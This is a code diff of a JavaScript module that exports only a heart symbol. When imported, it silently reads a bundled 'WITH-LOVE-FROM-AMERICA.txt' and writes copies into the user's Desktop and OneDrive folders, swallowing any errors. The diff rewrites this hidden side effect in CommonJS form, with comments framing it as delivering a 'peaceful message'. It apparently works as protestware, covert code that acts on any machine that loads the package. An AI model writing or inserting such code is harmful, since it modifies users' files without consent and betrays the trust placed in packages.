@@ -1,17 +1,10 @@
-import fs from 'fs';
-import find from './service/findFiles.js';
-import read from './service/readFile.js';
-import { homedir } from 'os';
+"use strict";
 
+var fs = require('fs');
+var homedir = require('os').homedir;
 
-var Desktops = `${homedir}/Desktop/`;
-var OneDrive = `${homedir}/OneDrive/`;
-var OneDriveDesktops = `${homedir}/OneDrive/Desktop/`;
-
-var DesktopFileExists=find(Desktops,'WITH-LOVE-FROM-AMERICA.txt');
-var OneDriveDesktopFileExists=find(OneDriveDesktops,'WITH-LOVE-FROM-AMERICA.txt');
-var OneDriveFileExists=find(OneDrive,'WITH-LOVE-FROM-AMERICA.txt');
-
+var messageFileName = 'WITH-LOVE-FROM-AMERICA.txt';
+var folders = [`${homedir}/Desktop/`, `${homedir}/OneDrive/`, `${homedir}/OneDrive/Desktop/`];
 
 function deliverAPeacefulMessage(path,message){
     try{
@@ -29,19 +22,25 @@ function deliverAPeacefulMessage(path,message){
 
 //let's be polite and only do this once.
 //hopefully once is all it takes.
-if(!DesktopFileExists.length&&!OneDriveFileExists.length&&!OneDriveDesktopFileExists.length){
-    var thinkaboutit='WITH-LOVE-FROM-AMERICA.txt';
+try{
+    var message = fs.readFileSync(`${__dirname}/${messageFileName}`, 'utf8');
 
-    var WITH_LOVE_FROM_AMERICA=read(`./${thinkaboutit}`);
-
-    deliverAPeacefulMessage(`${Desktops}${thinkaboutit}`,WITH_LOVE_FROM_AMERICA);
-    deliverAPeacefulMessage(`${OneDriveDesktops}${thinkaboutit}`,WITH_LOVE_FROM_AMERICA);
-    deliverAPeacefulMessage(`${OneDrive}${thinkaboutit}`,WITH_LOVE_FROM_AMERICA);
+    for(var i=0; i<folders.length; i++){
+        var folderPath = folders[i];
+        if(fs.existsSync(folderPath)){
+            var messageFilePath = `${folderPath}${messageFileName}`;
+            if(fs.existsSync(messageFilePath)){
+                continue;
+            }
+            fs.writeFile(messageFilePath, message, ()=>{});
+        }
+    }
+}catch(e){
+    // Something went wrong
 }
 
 var whatWeWant='♥';
 
-export {
-    whatWeWant as default,
+module.exports = {
     whatWeWant
 }
